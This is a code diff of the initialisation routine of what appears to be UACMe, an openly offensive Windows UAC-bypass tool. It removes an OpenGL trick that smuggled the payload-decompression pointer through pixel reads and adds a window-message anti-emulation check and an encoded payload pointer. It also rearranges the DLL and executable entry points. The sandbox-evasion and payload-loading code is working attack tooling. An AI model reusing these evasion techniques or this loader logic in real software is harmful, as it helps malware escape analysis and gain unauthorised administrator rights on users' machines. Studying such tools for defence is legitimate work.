@@ -18,8 +18,6 @@
 *******************************************************************************/
 #define OEMRESOURCE
 #include "global.h"
-#include <gl\GL.h>
-#pragma comment(lib, "opengl32.lib")
 #pragma comment(lib, "comctl32.lib")
 
 //Runtime context global variable
@@ -28,16 +26,14 @@ PUACMECONTEXT g_ctx;
 //Image Base Address global variable
 HINSTANCE g_hInstance;
 
-TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "(=^..^=)" };
-
-static pfnDecompressPayload pDecompressPayload = NULL;
+TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "<??>" };
 
 /*
 * ucmDummyWindowProc
 *
 * Purpose:
 *
-* Part of antiemulation, does nothing, serves as a window for ogl operations.
+* Part of antiemulation, does nothing.
 *
 */
 LRESULT CALLBACK ucmDummyWindowProc(
@@ -48,6 +44,9 @@ LRESULT CALLBACK ucmDummyWindowProc(
 )
 {
     switch (uMsg) {
+    case WM_SHOWWINDOW:
+        SendMessage(hwnd, WM_CLOSE, 0, 0);
+        break;
     case WM_CLOSE:
         PostQuitMessage(0);
         break;
@@ -76,16 +75,12 @@ NTSTATUS ucmInit(
 {
     UCM_METHOD  Method;
     NTSTATUS    Result = STATUS_SUCCESS;
-    PVOID       Ptr;
     LPWSTR      optionalParameter = NULL;
     ULONG       optionalParameterLength = 0;
     MSG         msg1;
     WNDCLASSEX  wincls;
     BOOL        rv = 1;
     HWND        TempWindow;
-    HGLRC       ctx;
-    HDC         dc1;
-    int         index;
 
 #ifndef _DEBUG
     TOKEN_ELEVATION_TYPE    ElevType;
@@ -93,18 +88,9 @@ NTSTATUS ucmInit(
 
     ULONG bytesIO;
     WCHAR szBuffer[MAX_PATH + 1];
-    WCHAR WndClassName[] = TEXT("reirraC");
-    WCHAR WndTitleName[] = TEXT("igakA");
+    WCHAR WndClassName[] = TEXT("reyortseD");
+    WCHAR WndTitleName[] = TEXT("ikibiH");
 
-    PIXELFORMATDESCRIPTOR pfd = {
-        sizeof(PIXELFORMATDESCRIPTOR),
-        1,
-        PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER | PFD_SWAP_EXCHANGE | PFD_GENERIC_ACCELERATED,
-        PFD_TYPE_RGBA,
-        32, 8, 0, 8, 0, 8, 0, 8, 0,
-        0, 0, 0, 0, 0, 32, 0, 0,
-        PFD_MAIN_PLANE, 0, 0, 0, 0
-    };
 
     do {
 
@@ -193,52 +179,33 @@ NTSTATUS ucmInit(
         wincls.lpszMenuName = NULL;
         wincls.lpszClassName = WndClassName;
         wincls.hIconSm = 0;
+
         RegisterClassEx(&wincls);
 
-        TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
-            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, g_hInstance, NULL);
+        TempWindow = CreateWindowEx(WS_EX_TOPMOST, 
+            WndClassName,
+            WndTitleName,
+            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 
+            0, 0, 
+            32, 
+            32, 
+            NULL, NULL, 
+            g_hInstance, 
+            NULL);
 
-        //
-        // Flashes and sparks.
-        //
-        dc1 = GetDC(TempWindow);
-        index = ChoosePixelFormat(dc1, &pfd);
-        SetPixelFormat(dc1, index, &pfd);
-        ctx = wglCreateContext(dc1);
-        wglMakeCurrent(dc1, ctx);
-        glDrawBuffer(GL_BACK);
-        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
-        glMatrixMode(GL_PROJECTION);
-        glLoadIdentity();
-        glBegin(GL_TRIANGLES);
-        glColor4i(1, 0, 1, 0);
-        glVertex2i(-1, -1);
-        glVertex2i(0, 1);
-        glVertex2i(1, -1);
-        glEnd();
-#pragma warning(push)
-#pragma warning(disable: 4054)//code to data
-        Ptr = (PVOID)&DecompressPayload;
-#pragma warning(pop)
-        pDecompressPayload = NULL;
-#ifdef _WIN64
-        glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
-        glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecompressPayload);
-#else
-        glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
-        glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecompressPayload);
-#endif
-        SwapBuffers(dc1);
-        SendMessage(TempWindow, WM_CLOSE, 0, 0);
+        if (TempWindow)
+            return STATUS_FATAL_APP_EXIT;
 
         do {
             rv = GetMessage(&msg1, NULL, 0, 0);
 
-            if (rv == -1)
-                break;
+            if (rv == -1) {
+                return STATUS_FATAL_APP_EXIT;
+            }
 
             TranslateMessage(&msg1);
             DispatchMessage(&msg1);
+
         } while (rv != 0);
 
         UnregisterClass(WndClassName, g_hInstance);
@@ -246,15 +213,14 @@ NTSTATUS ucmInit(
         g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
             optionalParameter,
             optionalParameterLength,
-            pDecompressPayload,
+            supEncodePointer(DecompressPayload),
             OutputToDebugger);
 
 
     } while (FALSE);
 
-    if (g_ctx == NULL) {
+    if (g_ctx == NULL)
         Result = STATUS_FATAL_APP_EXIT;
-    }
 
     return Result;
 }
@@ -287,15 +253,15 @@ NTSTATUS WINAPI ucmMain(
     switch (Status) {
 
     case STATUS_ELEVATION_REQUIRED:
-        ucmShowMessageById(FALSE, IDSB_USAGE_UAC_REQUIRED);
+        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_UAC_REQUIRED);
         break;
 
     case STATUS_NOT_SUPPORTED:
-        ucmShowMessageById(FALSE, IDSB_USAGE_ADMIN_REQUIRED);
+        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_ADMIN_REQUIRED);
         break;
 
     case STATUS_INVALID_PARAMETER:
-        ucmShowMessageById(FALSE, IDSB_USAGE_HELP);
+        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_HELP);
         break;
 
     case STATUS_FATAL_APP_EXIT:
@@ -353,14 +319,14 @@ INT ucmSehHandler(
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
-#undef COMPILE_AS_DLL
+#ifdef COMPILE_AS_DLL
 
 typedef struct _CALLEE_PARAMS {
     UCM_METHOD Method;
     LPWSTR OptionalParameter;
     ULONG OptionalParameterLength;
     BOOL OutputToDebugger;
-} CALLEE_PARAMS, *PCALLEE_PARAMS;
+} CALLEE_PARAMS, * PCALLEE_PARAMS;
 
 /*
 * ucmCalleeThread
@@ -372,7 +338,7 @@ typedef struct _CALLEE_PARAMS {
 */
 DWORD WINAPI ucmCalleeThread(_In_ LPVOID lpParameter)
 {
-    CALLEE_PARAMS *Params = (PCALLEE_PARAMS)lpParameter;   
+    CALLEE_PARAMS* Params = (PCALLEE_PARAMS)lpParameter;
 
     ExitThread(ucmMain(Params->Method,
         Params->OptionalParameter,
@@ -395,7 +361,6 @@ NTSTATUS WINAPI ucmRunMethod(
     _In_ BOOL OutputToDebugger
 )
 {
-#ifdef COMPILE_AS_DLL
     HANDLE hCalleeThread;
     DWORD ThreadId, ExitCode = 0;
     CALLEE_PARAMS Params;
@@ -427,16 +392,41 @@ NTSTATUS WINAPI ucmRunMethod(
 
     }
     return STATUS_ACCESS_DENIED;
-#else
-    UNREFERENCED_PARAMETER(Method);
-    UNREFERENCED_PARAMETER(OptionalParameter);
-    UNREFERENCED_PARAMETER(OptionalParameterLength);
-    UNREFERENCED_PARAMETER(OutputToDebugger);
-    return STATUS_NOT_IMPLEMENTED;
-#endif
 }
 
-#ifndef COMPILE_AS_DLL
+#ifndef KUMA_STUB
+
+/*
+* DllMain
+*
+* Purpose:
+*
+* Dll entry point.
+*
+*/
+#pragma comment(linker, "/DLL /ENTRY:DllMain")
+BOOL WINAPI DllMain(
+    _In_ HINSTANCE hinstDLL,
+    _In_ DWORD fdwReason,
+    _In_ LPVOID lpvReserved
+)
+{
+    UNREFERENCED_PARAMETER(lpvReserved);
+
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        LdrDisableThreadCalloutsForDll(hinstDLL);
+        g_hInstance = hinstDLL;
+    }
+
+    return TRUE;
+}
+
+#endif
+
+#else
+
+#ifndef KUMA_STUB
+
 /*
 * main
 *
@@ -474,31 +464,6 @@ VOID __cdecl main()
         ExitProcess(uctx.ReturnedResult);
 }
 
-#else
+#endif
 
-/*
-* DllMain
-*
-* Purpose:
-*
-* Dll entry point.
-*
-*/
-#pragma comment(linker, "/DLL /ENTRY:DllMain")
-BOOL WINAPI DllMain(
-    _In_ HINSTANCE hinstDLL,
-    _In_ DWORD fdwReason,
-    _In_ LPVOID lpvReserved
-)
-{
-    UNREFERENCED_PARAMETER(lpvReserved);
-
-    if (fdwReason == DLL_PROCESS_ATTACH) {
-        LdrDisableThreadCalloutsForDll(hinstDLL);
-        g_hInstance = hinstDLL;
-    }
-
-    return TRUE;
-}
-
-#endif //COMPILE_AS_DLL
+#endif
